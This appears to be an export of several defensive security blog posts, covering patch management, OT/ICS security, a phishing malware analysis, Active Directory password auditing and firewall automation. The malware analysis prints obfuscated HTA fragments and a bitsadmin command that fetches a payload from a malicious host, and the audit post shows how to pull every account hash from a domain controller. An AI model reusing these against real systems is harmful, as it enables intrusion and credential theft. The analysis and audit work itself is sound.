measures), the \u0026ldquo;value\u0026rdquo; they have for the organization itself\u0026hellip; That information is stored in the asset inventory and governed by the asset management process.\nExamples:\nWe have a vulnerable and exposed Palo Alto Network firewall with GlobalProtect, impact is high, likelihood is high (public exploit available) and there is no mitigation: the risk is severe. We have several vulnerable Microsoft Windows in the industrial network. The network is restricted and protected by a firewall with an IPS feature. We cannot upgrade those endpoints, impact is high, likelihood is high (public exploit available): risk is maximum but it\u0026rsquo;s mitigated by the firewall by 80% (risk is low). Most organizations implement time-based patch management. In other words, they declare they patch everything every 6 months. In many cases, this is wrong because:\nany organization has something that cannot be patched or disposed; there is always some urgency that delays the updating process. Moreover in the above example, there is no patch for the Palo Alto Network vulnerability, thus the vulnerability cannot be mitigated by the patch management process.\nActing in this way leads to unmanaged risk (see conclusions).\nApplication life cycle management Application Life cycle Management (ALM) covers several different aspects of applications from its initial planning through retirement. For the sake of this post, we are focusing on updating and retirement phases.\nSimplifying applications and their components must be updated. When (not if) components will become obsolete, the application must be updated to support updates or different components. In the real world, when components are retired, the application is not updated anymore: after years nobody knows how to change the code.\nFinally, at the end of their life applications must be retired. In the real world, applications are retired when nobody is using them anymore, and that can takes years.\nVulnerability management Vulnerability management is the process to evaluate the risk of known vulnerabilities and how to mitigate them. Security assessments (including Vulnerability Assessments, Penetration Tests, Attack Simulations\u0026hellip;) are the tools used to discover unknown vulnerabilities. Another important input of the vulnerability management process includes the security feeds.\nThe output of any security assessment is a list of prioritized actions required to manage the risks of discovered vulnerabilities.\nMany companies use VA as the basis of patch management. Once the VA has detected vulnerabilities, they are analyzed, evaluated, and patched.\nThat is a pretty common approach I find in enterprises and it\u0026rsquo;s the faster way to understand what is in place and plan remediation. But if you are using VA in the patch management process consider that:\nyou are discovering vulnerabilities only after the VA; in the worst-case scenario you are vulnerable from the day after the previous VA until the next one (unmanaged risk). Without a vulnerability management process, organizations running VA yearly can lead to unmanaged risk for 12 months (see conclusions).\nVA scanner limits Please be aware that:\nNetwork vulnerabilities are just a minor part, you should also look for local vulnerabilities. Local vulnerabilities are used for privilege escalation after the attacker has gained local access, maybe using malware or a custom vulnerable application (e.g. Log4j . VA scanners look for known, signature-based vulnerabilities. Sometimes they try to analyze web applications (DAST) but they will never recognize uncommon or custom applications. For example, VA scanners don\u0026rsquo;t detect all vulnerabilities in WordPress, and Joomla\u0026hellip; applications. You need to use specialized scanners (e.g. wpscan ). Conclusions VA scanners are great tools to quickly find out what is running within the organization and the associated vulnerabilities. Even if VA is executed every month, a critical vulnerability can put the organization at risk for one month (worst case scenario). Sometimes it is acceptable, sometimes not. If we cannot define it clearly, it means that we are not properly managing the risk.\nVA scanners are still a fundamental tool for organizations, and they are the fast path to assessing unknown environments. But after a while organizations should introduce vulnerability management together with patch management: monitoring security feeds reduces the risk of newly released vulnerabilities in days, not months.\nFor severe vulnerabilities, we can assume that patches must be installed within 24 hours. In the example above, the request for change requiring the patch from Palo Alto Networks has high priority. The patch from Microsoft Windows can be skipped because the risk is lower than the risk appetite (and also because updating HMI is a mess).\nIf everything is going fine, VA scanners won\u0026rsquo;t find severe vulnerabilities. In practice, if the above processes are in place, vulnerability assessment verifies that critical patches are installed and obsolete applications have been retired.\nMoreover, if you are changing the VA provider every year, you should ask if it makes sense, considering:\nmost of the partners are using VA scanners from two or three vendors; it isn\u0026rsquo;t so easy to automatically compare KPI between different software; the value is not from the automatic VA report, the value is after that (risk analysis, remediation plan). And, finally, if you are executing the n-th yearly VA and nothing more, you are not managing the Cyber risk at all. You are just following some odd guidelines. Sad but true.\n","cover":"/blog/2022/03/29/va-scanners-for-patch-management-good-or-bad/vulnerability-risk.webp","permalink":"https://www.adainese.it/blog/2022/03/29/va-scanners-for-patch-management-good-or-bad/","title":"VA scanners for patch management: good or bad?"},{"categories":["ot-ics","security","ciso"],"contents":"A few days ago, together with Rocco Sicilia and FESTO Academy , I presented a webinar on OT/ICS Cybersecurity approach. We are often spending time increasing Cybersecurity awareness, and that webinar was focused to gives Cybersecurity fundamentals to OT managers.\nUnderstanding the Attacker\u0026rsquo;s point of view The main discussion was about the Threat Actors, I mean, the attackers. Understanding the attackers gives us the big picture about the different business models they have (the \u0026ldquo;why\u0026rdquo;, using a definition by Simon Sinek ). We focused on:\nthe evolving Cybercrime phenomena; the value the attacker is looking for; types of attackers, goals, and budgets; Then we discussed some popular Cyberattacks: from WannaCry and NotPetya (2017) which I consider IT attacks to OT/ICS specific attacks: Stuxnet (Iran, 2010), BlackEnergy (Ukraine, 2015), Triton (Saudi Arabia, 2017), Florida city\u0026rsquo;s water supply (2021), Colonial Pipeline (2021), and the recent Viasat attack (2022).\nEven if IT and OT attacks have different targets, we reviewed how attackers are used to breach in enterprises: three out of four Threat Vectors are based on human behavior, one Threat Vector only is technology-based.\nWhy (do we interconnect critical devices to Internet?) Based on the previous paragraph the question is legitimate and the answer is obvious: the Industry 4.0 era is based on fast and automatic interactions (data exchanges). Data can be automatically transmitted between components, plants, systems, suppliers, customers\u0026hellip; The more automatic and fast the process is, the more profitable the business is.\nCyberspace provides tools, methods, and interactions to get more opportunities.\nBut at the same time:\nIt is considered the fifth theater of warfare.\nPlace ourselves out of Cyberspace or interconnecting everything without considering the consequences are extreme solutions. We need to find the right balance between them.\nFind the correct proportion between freedom, even unconscious, and security\nPeculiarities of OT/ICS devices The next chapter was about OT/ICS peculiarities. The audience was already aware, but we presented them from an IT perspective:\ndesigned for \u0026ldquo;availability\u0026rdquo;: the same term is used in the IT world with a different meaning; extremely sensitive to Ethernet disruptions and overloads: remember that Ethernet networks can fail by design (STP convergence); communications do not guarantee confidentiality, integrity, and availability: those are fundamentals attributes in IT security; long term life: compared to the IT world, we can see plants 20 years old; not subject to the same life cycle as IT components: production OT/ICS components (including HMI) are usually \u0026ldquo;untouchable\u0026rdquo;. Based on our experiences, we presented seven common issues:\nShadow OT: nobody knows exactly what is installed in plant networks and why (e.g. WiFi networks, cloud base telemetry, vulnerable devices, default passwords, remote access devices\u0026hellip;). That leads to unmanaged Risk. Weak and sensitive protocols: OT/ICS protocols don\u0026rsquo;t follow the CIA triage used in IT, but they run on Ethernet networks. That leads to unexpected behaviors. Long term life devices: 5 years old plants installed and not maintained are vulnerable to well-known attacks. OT/ICS plants tend to be Legacy, weak and harmful. Remote maintenance: remote 3rd party operators can connect to critical plants anytime and acts locally, watch sensitive production processes and information (espionage and sabotage). Removable storage: 3rd party operators are used to upgrading software via untrusted USB keys. It\u0026rsquo;s not uncommon that malware spread via USB even today. The list is not intended to be complete, of course; those are the main issues that industries are reporting to us.\nHow (should we approach Cybersecurity in OT/ICS environments?) Without reinventing the wheel, there are many standards and frameworks which can be used: Framework for Improving Critical Infrastructure Cybersecurity (NIST) , CIS Controls , UNI ISO 31000:2018 Risk management — Guidelines, Protecting Controlled Unclassified Information in Nonfederal Systems and Organizations ( 800-171 and 800-172 ) and Secure Architecture for Industrial Control Systems (Purdue Model) were discussed during the webinar.\nSpecial mention for the IEC62443 standard: it should be taken into account for both integrators and customers. Even if we still don\u0026rsquo;t have regulations for medical and industry sectors, IEC62443 is supposed to be a sort of guideline.\nThe purpose of this phase is to plan a strategy taking into accounts\nWhat (should we do in practice?) Cybersecurity is a process and is implemented with organization and technical measures. In practice we want to build a continuous improvement process, starting from the first major issue: Shadow OT.\nWe cannot protect what we don\u0026rsquo;t know.\nThe first step requires assessing the OT/ICS infrastructure, and finding out what is installed, the purpose, the business impact, the weakness or robustness\u0026hellip; Then we can move on to the supplier, partners, 3rd parties, and employees and evaluate the Cybersecurity risk.\nWe can suppose a 4-phases improvement process:\nCheck: measures the Cybersecurity posture (get qualitative or quantitative values regarding the many Cybersecurity aspects). Act: analyze the associated Risk and highlight the unacceptable ones. Plan: define a strategy to mitigate the unacceptable risks, taking into account standards and regulations. Do: govern and supervise the implementation. It\u0026rsquo;s a PDCA cycle, but I\u0026rsquo;m starting from the third phase because I assume the first two steps are already been completed during the first iteration. It is expected that the next CHECK phase will get better KPI (Key Performance Indicators).\nIT - OT Convergence An interesting discussion was about IT and OT convergence: should we go for it?\nI consider IT and OT two different worlds with different values and rules. In my opinion, they cannot converge and they shouldn\u0026rsquo;t. If IT guys follow the CIA (Confidentiality, Integrity, Availability) triad, the OT guys are following a sort of Safety, Reliability, and Productivity triad. Moreover, if uniqueness is something to avoid in IT (we don\u0026rsquo;t want to reinvent the wheel), customization is expected in OT/ICS.\nBut the IT and OT Cybersecurity must converge. Moreover, Cybersecurity must be a common overlay for all organization departments. The IT and OT Cybersecurity convergence point is defined by:\nSafety first. A Risk-based approach. Open mindset and dialogue with stakeholders. Conclusions Preparing a webinar or a training path is a good way to review concepts and organize them in a coherent flow. I hope auditors could get a different point of view regarding OT/ICS security. Slides are available and the additional session will be delivered in the future.\n","cover":"/blog/2022/03/28/approaching-ot/ics-cybersecurity/cybercrime-gangs.webp","permalink":"https://www.adainese.it/blog/2022/03/28/approaching-ot/ics-cybersecurity/","title":"Approaching OT/ICS Cybersecurity"},{"categories":["security"],"contents":"These days I\u0026rsquo;m receiving more requests for help than ever. Most of them refer to suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast.\nI want to present a couple of cases I recently received to help:\nIT managers to properly set up a notification and response process; end-users to evaluate suspicious emails. GDPR recap European firms should already have a data breach notification process defined and communicated to employees. But just in case let\u0026rsquo;s review relevant GDPR articles:\nArt. 4.12 - Definitions: personal data breach means a breach of security leading to the *accidental or unlawful destruction, loss, alteration, unauthorized disclosure of, or access to, personal data- transmitted, stored or otherwise processed; Art. 33.1 - Notification of a personal data breach to the supervisory authority: In the case of a personal data breach, the controller shall - without undue delay and, where feasible, *not later than 72 hours after having become aware of it, notify the personal data breach to the supervisory authority competent- in accordance with Article 55, unless the personal data breach is unlikely to result in a risk to the rights and freedoms of natural persons. Where the notification to the supervisory authority is not made within 72 hours, it shall be accompanied by reasons for the delay. Art. 33.5 - Notification of a personal data breach to the supervisory authority: The controller shall document any personal data breaches, comprising the facts relating to the personal data breach, its effects, and the remedial action is taken. That documentation shall enable the supervisory authority to verify compliance with this Article. In practice, firms must have procedures to:\ncommunicate data breaches to the firm itself (notification); evaluate the risk associated with data breaches (response); registry data breaches and related analysis (tracking). Referring to the GDPR data breach definition, we can say that most of the incidents are security incidents. In fact, following ITIL, incidents are:\nITIL defines an incident as an unplanned interruption to or quality reduction of an IT service.\nBut an unplanned event will affect personal data one way or another, so any incident affecting personal data is defined as a data breach. Thus we can have a single set of procedures describing the incident management process.\nNotification We are speaking about incident management procedures in a later article. For now, just be sure a notification process is in place inside the organization. For the sake of this specific post, the notification is referring to the user\u0026rsquo;s request about a suspicious email. The users are required to forward as an attachment any suspicious email or use any integration which will automatically do the same thing.\nI\u0026rsquo;m also using the same procedure to evaluate how many users are detecting phishing emails and alerting the SOC.\nEmail analysis In most cases, I get an email in msg format (from Microsoft Outlook). I\u0026rsquo;m converting them into eml format using:\nmsgconvert *.msg Below you can see email headers and bodies for both cases. From a user perspective:\nemails are written in correct Italian; there is no valid reason why a government department would write via standard email (in Italy we have a special email system called PEC); both emails are unsolicited; both emails have image trackers; both emails have attachments (ZIP files). Because emails are unsolicited and because of the ZIP files attached, users should notify email to the internal department for additional analysis. To be honest, I won\u0026rsquo;t blame users that click on them because they are very well-formatted.\nQuestions we need to answer:\nAre the emails malicious? Why have emails been delivered to users and not filtered by the anti-spam? Does anyone open and execute attachments? Case 1 email headers and body Date: Tue, 8 Mar 2022 12:06:44 +0000 Subject: Circolare 07.03.2022 , comunicazione aiuti per le societa From: mise.gov.it \u0026lt;ufficio@mise.gov.it\u0026gt; To: \u0026lt;mario.rossi@example.com\u0026gt; Received: from plexkck-1.localdomain ([5.135.192.105]) by antispam.example.com with ESMTP id nCz5MOHOACUQg9dv (version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for \u0026lt;mario.rossi@example.com\u0026gt;; Tue, 08 Mar 2022 13:06:45 +0100 (CET) Received: by plexkck-1.localdomain (Postfix, from userid 10004) id 90A8BA190C; Tue, 8 Mar 2022 12:06:44 +0000 (UTC) Reply-To: \u0026lt;ufficio@mise.gov.it\u0026gt; X-Virus-Scanned: by bsmtpd at example.com Return-Path: iptvtc@iptvtc.com \u0026lt;https://i.ibb.co/nmbxdJ7/external-content-duckduckgo-com.jpg\u0026gt; Il Ministero dello Sviluppo Economico, dipartimento per lo sviluppo dell\u0026#39;economi a, sezione per la promozione delle attivita imprenditoriali, Dispone: La presente circolare fornisce chiarimenti in merito alla tipologia, alle condizioni, ai limiti, alla durata e alle modalita di fruizione delle agevolazioni fiscali e contributive previste per il pacchetto di aiuti alle ditte , al fine di portare a conoscenza dei soggetti interessati, anteriormente. In allegato l\u0026#39;archivio recante i dettagli riguardanti le singole tipologie di attivita e l\u0026#39;elenco delle varie modalita di fruizione. Via Giorgione, 2b - 00147 Roma mise.gov.it Case 2 email headers and body Date: Wed, 23 Feb 2022 06:46:54 +0100 Subject: notifica al contribuente per documentazione mancante From: Vincenzo Damato \u0026lt;vincenzo.damato@inps.it\u0026gt; To: \u0026lt;privacy@example.com\u0026gt; Received: from h2677552.stratoserver.net (advancedesign.de [85.214.135.204]) by antispam.example.com with ESMTP id aN9SvNX5AeAZooYL (version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for \u0026lt;privacy@example.com\u0026gt;; Wed, 23 Feb 2022 06:46:55 +0100 (CET) Received: by h2677552.stratoserver.net (Postfix, from userid 10001) id 843862561C61; Wed, 23 Feb 2022 06:46:54 +0100 (CET) Reply-To: \u0026lt;vincenzo.damato@inps.it\u0026gt; X-Virus-Scanned: by bsmtpd at example.com \u0026lt;https://i.ibb.co/51VfRPp/INPS.jpg\u0026gt; Gentile contribuente, Le notifichiamo che non è stata accolta la domanda in oggetto , corrisposta il 14.01.2021 , per il seguente motivo : Lei non ha fornito la documentazione che è stata richiesta il 04/01/2021 e, di conseguenza, non è stato possibile proseguire all\u0026#39;accertamento del diritto alla prestazione. La informiamo oltre a tutto che, nel caso in cui volesse contrastare il presente provvedimento, potrà presentare un reclamo amministrativo solamente on line tramite l\u0026#39;apposita sezione sul portale INPS. L\u0026#39;eventuale azione giudiziaria contro il presente provvedimento dovrà essere notificata presso questa agenzia, avendo il rappresentante legale dell\u0026#39;istituto eletto a tal fine domicilio speciale presso l\u0026#39;agenzia stessa, ai sensi dell\u0026#39;art. 48 del codice penale e per gli effetti di cui all\u0026#39;art. 30 del codice di procedura civile . La preghiamo di prendere visione della documentazione esaustiva riguardante la sua richiesta e il provvedimento, entrambi presenti nell\u0026#39;archivio allegato e scaricabile nella presente e-mail. L\u0026#39;ufficio è a sua completa disposizione per ogni informazione o chiarimento. Il responsabile di unità operativa Vincenzo Damato SPF analysis The first question that popped into my mind was about the anti-spam: is it working fine?\nThe basic check requires evaluating the SPF record and finding out if source IP addresses were allowed to send those emails. Let\u0026rsquo;s get the SPF record:\ndig -t txt mise.gov.it +noall +answer dig -t txt inps.it +noall +answer MISE SPF record analysis The SPF record for MISE is:\nv=spf1 ip4:85.20.209.229 ip4:85.20.209.232 ip4:212.17.196.121 ip4:89.119.244.34 ip4:89.119.244.35 ip4:89.119.244.88 ip4:85.20.124.52 ip4:89.119.244.44 include:esg01.mise.gov.it include:esg02.mise.gov.it include:esg03.mise.gov.it -all The source IP address of MISE email is: 5.135.192.105. It is assigned to a German company, and it is included in some RBL lists and it is not included in the SPF record .\nThe anti-spam should have filtered it, so it\u0026rsquo;s misconfigured.\nINPS SPF record analysis v=spf1 ip4:89.97.177.19 ip4:89.97.177.3 ip4:93.63.43.112 ip4:93.63.43.115 ip4:93.63.43.113 ip4:93.63.43.114 ~all The source IP address of INPS email is: 85.214.135.204. It is assigned to a German company, and it is not included in RBL lists and it is definitely not included in the SPF record .\nThe anti-spam should have filtered it or added a SPAM tag, so it\u0026rsquo;s misconfigured.\nAttachment analysis Both emails contain a ZIP file, to extract attachments from eml files I use:\nmunpack *.eml Both emails contain a compressed hta file. HTA stands for HTML Application, and it\u0026rsquo;s an executable HTML page that contains some script code (What a great idea!). The file is executed through mshta.exe available by default.\nWe are using VirusTotal and Any.Run to analyze them. Remember: don\u0026rsquo;t upload any confidential files on those portals because they will be shared with subscribers.\nMISE attachment analysis The MISE HTA file is obfuscated and appears to be encrypted:\n\u0026lt;META NAME=\u0026#39;GENERATOR\u0026#39; Content=\u0026#39;The source code of this page is encrypted with HTML Guardian, the world\u0026#39;s standart for website protection. Visit http://www.protware.com for details\u0026#39;\u0026gt;\u0026lt;meta http-equiv=\u0026#39;expires\u0026#39; content=\u0026#39;\u0026#39;\u0026gt; \u0026lt;script\u0026gt;l1l=document.documentMode||document.all;var ca8b5d6e=true;ll1=document.layers;lll=window.sidebar;ca8b5d6e=(!(l1l\u0026amp;\u0026amp;ll1)\u0026amp;\u0026amp;!(!l1l\u0026amp;\u0026amp;!ll1\u0026amp;\u0026amp;!lll));l_ll=location+\u0026#39;\u0026#39;;l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)\u0026gt;0?true:false};lII=lI1(\u0026#39;kht\u0026#39;)|lI1(\u0026#39;per\u0026#39;);ca8b5d6e|=lII;zLP=location.protocol+\u0026#39;0FD\u0026#39;;qxPX21ALo321P=\u0026#39;vrexI\u0026#39;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;...\u0026lt;/script\u0026gt; Few anti-malware report it as malware, as per VirusTotal report . The initial report is from 2022-03-24 16:21:23 UTC reported by myself. It will probably change in the future.\nIf we execute the file using AnyRun, we can see that it downloads a file using BITSADMIN.EXE:\n\u0026#34;C:\\Windows\\System32\\bitsadmin.exe\u0026#34; /transfer 8 http://ecologilink.top/notepad.txt C:\\Users\\admin\\AppData\\Local\\Temp\\online.exe The malicious server is no more available, so the malware, even if executed, is harmless. We should now check who has downloaded http://ecologilink.top/notepad.txt and verify if the anti-malware logs.\nYou can see the full report Any.Run report and look at malware behavior.\nINPS attachment analysis The INPS HTA file is obfuscated:\n\u0026lt;script language=\u0026#34;vbscript\u0026#34;\u0026gt; execute(\u0026#34;XRQyEEDmMAdVnEQgHZjytwdffVifYTQiMDH = array(192, 224, 117, 214, 188, 201, ... \u0026lt;/script\u0026gt; Few anti-malware report it as malware, as per VirusTotal report .\nFew anti-malware reports it as malware, as per VirusTotal report . The initial report is from 2022-02-23 08:51:27 UTC reported by myself. It will probably change in the future.\nIf we execute the file using AnyRun, we can see that it triggers the download of some files from WindowsUpdate and DigiCert. Both sites are secure, but I guess the malware has detected the AnyRun sandbox and stopped the execution.\nAccording to the full report Any.Run report we can see that the malware accessed a lot of Windows Registry keys, and in particular, has gathered information about NTP and localization. We can assume that the malware stopped because it recognized the sandbox.\nConclusions and suggested best practices Besides the malware analysis approach I used, we realized that organizations should have in place a procedure to notify events and anomalies. Specific training should be delivered to end-users also, covering:\nbasic email analysis to identify SPAM and malware emails; How to request helps and notify those emails; responsibility of the users regarding malware notification especially if they clicked on the malicious attachment (be inclusive, avoid punishment). Moreover, from a technical perspective:\nfix and verify the anti-spam configuration (possibly filter out some attachment file types); deny URLs included in malicious categories; deny URLs not already categorized (new domains); implement SSL inspection for outgoing web traffic (exclude sensitive websites, like banking and update the internal policy); implement a logging platform and include it in the incident management process. ","cover":"/images/categories/security.webp","permalink":"https://www.adainese.it/blog/2022/03/25/malware-analysis/","title":"Malware analysis"},{"categories":["security"],"contents":"Any password policy, even with strict rules, can be easily bypassed with simple tricks: Passw0rd!, Passw0rd$, Password!1 can be all valid passwords for length and complexity.\nIn this common scenario it\u0026rsquo;s useful to regularly audit Active Directory passwords against password dictionaries (like RockYou) and/or HaveIBeenPwned .\nLet\u0026rsquo;s see how to audit Active Directory passwords using Directory Services Internals PowerShell Module and Framework .\nInstall Open PowerShell with administrative privileges and check PowerShell version:\nPS C:\\Windows\\system32\u0026gt; $PSVersionTable $PSVersionTable must be 5.1 at least.\nInstall DSInternals:\nPS C:\\Windows\\system32\u0026gt; Install-Module DSInternals -Force If you got the error PackageManagement\\Install-PackageProvider : No match was found for the specified search criteria for the provider 'NuGet'. The package provider requires 'PackageManagement' and 'Provider' tags, modify the security protocols (default is Ssl3 and Tls), and reinstall:\nPS C:\\Windows\\system32\u0026gt; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 PS C:\\Windows\\system32\u0026gt; $PSVersionTable List available cmdlets:\nPS C:\\Windows\\system32\u0026gt; Get-Command -Module DSInternals* Find weak passwords on a Domain Controller Before we start the audit process, we need at least one dictionary file. Download any wordlist .\nSet environment:\n$DictFile = \u0026#34;C:\\Users\\Administrator\\Downloads\\rockyou.txt\u0026#34; $DC = \u0026#34;dc01\u0026#34; $Domain = \u0026#34;DC=example,DC=com\u0026#34; Start the audit:\nGet-ADReplAccount -All -Server $DC -NamingContext $Domain | Test-PasswordQuality -WeakPasswordsFile $DictFile -IncludeDisabledAccounts We can also build a report in CSV format:\nPS C:\\Users\\Administrator\u0026gt; $Accounts = Get-ADReplAccount -All -Server $DC -NamingContext $Domain PS C:\\Users\\Administrator\u0026gt; $Results = $Accounts | Test-PasswordQuality -WeakPasswordsFile $DictFile PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts = $Accounts | where {$Results.WeakPassword -match $_.SamAccountName} PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts | select SamAccountName,DisplayName,DistinguishedName | Export-Csv output.csv Mind that there are no built-in tools to set the list of bad passwords for Active Directory Domain Services.\nExport data for a remote audit At this moment, DSInternals cannot serialize accounts. See the associated issue .\nOnce it\u0026rsquo;s fixed, the procedure should be as follows.\nPS C:\\Users\\andrea\u0026gt; $Password = Read-Host \u0026#34;Enter password (16 chars)\u0026#34; -AsSecureString PS C:\\Users\\andrea\u0026gt; $Accounts = Get-ADReplAccount -All -Server $DC -NamingContext $Domain PS C:\\Users\\andrea\u0026gt; $SerialAccounts = [System.Management.Automation.PSSerializer]::Serialize($Accounts) PS C:\\Users\\andrea\u0026gt; $SerialAccounts | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString -SecureKey $Password | Set-Content -Path credentials.txt Move the file to an external station with PowerShell 7 and get the data back:\nPS C:\\Users\\andrea\u0026gt; $Password = Read-Host \u0026#34;Enter password (16 chars)\u0026#34; -AsSecureString PS C:\\Users\\andrea\u0026gt; $SerialAccounts = Get-Content -Path credentials.txt | ConvertTo-SecureString -SecureKey $Password | ConvertFrom-SecureString -AsPlainText PS C:\\Users\\andrea\u0026gt; $Accounts = [System.Management.Automation.PSSerializer]::DeSerialize($SerialAccounts) Analyze the data as we did previously:\n$DictFile = \u0026#34;C:\\Users\\andrea\\Downloads\\rockyou.txt\u0026#34; $DC = \u0026#34;dc01\u0026#34; $Domain = \u0026#34;DC=example,DC=com\u0026#34; PS C:\\Users\\Administrator\u0026gt; $Results = $Accounts | Test-PasswordQuality -WeakPasswordsFile $DictFile PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts = $Accounts | where {$Results.WeakPassword -match $_.SamAccountName} PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts | select SamAccountName,DisplayName,DistinguishedName | Export-Csv output.csv Check for breached credentials (HaveIBeenPwned) I\u0026rsquo;m used to testing if users are using leaked passwords. To do that, download the password list from HaveIBeenPwned , and use the ordered by hash NTLM file.\nAnalyze the weak passwords using the downloaded file:\nPS C:\\Users\\Administrator\\Downloads\u0026gt; $Accounts | Test-PasswordQuality -WeakPasswordHashesSortedFile .\\pwned-passwords-ntlm-ordered-by-hash-v8.txt PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts = $Accounts | where {$Results.WeakPassword -match $_.SamAccountName} PS C:\\Users\\Administrator\u0026gt; $RiskyAccounts | select SamAccountName,DisplayName,DistinguishedName | Export-Csv output.csv Next steps Each account with a weak password should be forced to change the password at the next login. The user should also be notified via email. According to the organization\u0026rsquo;s policies, this could count as a security incident.\nReferences Directory Services Internals PowerShell Module and Framework Auditing Weak Passwords in Active Directory Test-PasswordQuality Active Directory Password Audit – Using Pwned Passwords SecLists Downloading the Pwned Passwords list ","cover":"/images/categories/security.webp","permalink":"https://www.adainese.it/blog/2022/02/08/auditing-active-directory-passwords-against-haveibeenpwned/","title":"Auditing Active Directory passwords against HaveIBeenPwned"},{"categories":["automation"],"contents":"I spent a few Twitch sessions speaking about the automation of Palo Alto Networks firewalls. We used different approaches than the one used with Cisco devices. Initially, we developed a few simple Ansible playbooks. In the last sessions, we developed a very small Django web application to programmatically enable and disable network flows.\nAnsible with Palo Alto Networks firewall The Palo Alto Networks module for Ansible has some prerequisites:\npip install pan-os-python pan-python pandevice xmltodict requests requests_toolbelt See the first episode (S01E01) then install PAN-OS Ansible collection:\nansible-galaxy collection install paloaltonetworks.panos The interpreter_python on ansible.cfg file must point to the interpreter with the PanOS libraries installed. This is important if you\u0026rsquo;re using a virtual environment.\nFirewall credentials are not passed in the standard way, but a specific dictionary must be passed to each task. We populated the dictionary from Ansible parameters as following:\n- set_fact: provider: ip_address: \u0026#34;{{ ansible_host }}\u0026#34; password: \u0026#34;{{ ansible_password }}\u0026#34; username: \u0026#34;{{ ansible_user }}\u0026#34; Getting facts The Palo Alto Network module is not using the gather_facts parameter; instead, it\u0026rsquo;s defining a custom task to retrieve facts:\n- paloaltonetworks.panos.panos_facts: provider: \u0026#34;{{ provider }}\u0026#34; Sending operational commands The module panos_op allows sending commands to the firewall. The module translates the given command into XML and uses the XML API. Some commands can fail so the best way is to specify commands using the XML syntax. The following command is failing:\ncmd: \u0026#39;show arp management\u0026#39; # Fails with \u0026#34;show -\u0026gt; arp has unexpected text.\u0026#34; The following command is working:\ncmd: \u0026#34;\u0026lt;show\u0026gt;\u0026lt;arp\u0026gt;\u0026lt;entry name=\u0026#39;management\u0026#39;/\u0026gt;\u0026lt;/arp\u0026gt;\u0026lt;/show\u0026gt;\u0026#34; cmd_is_xml: true The API browser, available on the Firewall using the /api URL can help to find out the right request. The above API is available at /php/rest/browse.php/op::show::arp.\nWe used panos_op to get system info and the ARP table .\nBecause operational commands are sent in the XML format, the output is automatically converted to JSON from the Ansible module. Remember that XML can be converted to JSON/YAML and back, but mind that XML attributes will be usually lost.\nSending configuration commands We wrote the fourth playbook to test configuration commands. There are many configuration commands available from the Ansible module but we are limited to configuring some management interface parameters.\nWe discussed a few about how to \u0026ldquo;zero-touch provision\u0026rdquo; a Palo Alto Network firewalls. Even if we didn\u0026rsquo;t test the scenario, we agreed that we could write a working playbook.\nConfiguration templating Even if configuration commands could be used to manage a lot of firewall features, we tested a different approach: configuration templating. Because Palo Alto Network firewalls have the commit feature, in my opinion, this is the best approach.\nMy idea is:\nprepare a configuration template (Jinja2); build the firewall configuration from the template using an external configuration file (model); upload the firewall configuration file and enable it. The fifth playbook implement this approach.\nPros and cons of this approach:\nthe entire firewall configuration can be stored in a CMDB file (pro); the firewall configuration is always consistent (pro); we can configure almost everything (pro); we don\u0026rsquo;t need to make checks before inserting a specific configuration in a running firewall (pro); we need to spend a lot of time designing our firewall model (cons). Programming the firewall using external feeds Many firewalls can read external feeds: the content can be used as a source or destination in access lists. This approach is perfect to allow temporary access. In the last session we created a small web application using Django.\nThe application provides feeds containing IP addresses. Each IP address has an expiration date. Once the IP address is expired, it is removed from the feed.\nInstalling Django Install Django into a Python environment (see S01E01):\npip install Django==4.0.1 Creating the Django application Create the first Django project and an application within it:\ndjango-admin startproject feedapp cd feedapp django-admin startapp edlprovider ./manage.py migrate By default, the database is an SQLite file stored under the Django root folder. The app must be loaded in the settings.py file stored in the feedapp folder:\nINSTALLED_APPS = [ ... \u0026#34;edlprovider\u0026#34;, ] Create the admin user:\n./manage.py createsuperuser Modeling In the simplest version of our application, we can expect that:\nan admin user is adding one or more EDL objects (list of IP addresses); an admin user is adding one or more IP addresses to one EDL object; possibly an expiration time can be set to each IP address; unexpired IP addresses will be available in a text list under a specific, non-guessable, URL. In other words, we have two objects:\nEDL with ID, name, URL; IP with name, expiration date (optional), associated EDL. When the model is complete, we need to update the migration scripts and upgrade the database schema:\n./manage.py makemigrations ./manage.py migrate Admin page By default, Django provides an admin page for each model. It can be enabled by adding in the admin.py file:\nadmin.site.register(models.EDL) admin.site.register(models.IPAddress) Open the Django application using the URL /admin, and add one EDL with at least one IP address.\nPrinting EDLs The view.py file is used to serve custom HTTP requests. We need to print the content of each EDL if a GET is requesting the EDL id (slug). The URL is defined in the rrapp/urls.py file.\nAll IP addresses linked to a specific EDL are printed in text format if the expiration date is in the future.\nStarting the server In the settings.py file you can configure Django to serve any client. This is an insecure configuration. Add * to the ALLOWED_HOSTS:\nALLOWED_HOSTS = [\u0026#39;*\u0026#39;] Start the application:\n./manage.py runserver 0.0.0.0:8000 The Django application is now reachable. Use the /admin URL and log in with the superuser credentials created before.\nUsing the EDL from a PANW firewall Once an EDL is populated, it can be used as a source or destination on ACLs.\nEDL can be debugged with the following commands:\nadmin@fw\u0026gt; request system external-list stats type ip name EDL1 admin@fw\u0026gt; request system external-list show type ip name EDL1 admin@fw\u0026gt; request system external-list refresh type ip name EDL1 Last note: when an IP address is removed from an EDL, the session is not cleared. In other words, the established sessions are maintained, and new sessions are dropped.\nA script should clear sessions related to expired IP addresses:\nadmin@fw\u0026gt; clear session all filter rule TestEDL1 destination 192.168.28.152 Mind also that firewall usually probes URLs every 5 minutes, so the clear command should be executed 5 minutes after the expiration date. The web application should be extended to track requests and if they have been cleared.\nReferences Ansible with PANW Automating Dynamic Lists for PANW firewalls PAN-OS Ansible Collection PAN-OS Ansible Collection Documentation PAN-OS XML API Labs with pan-python External Dynamic List 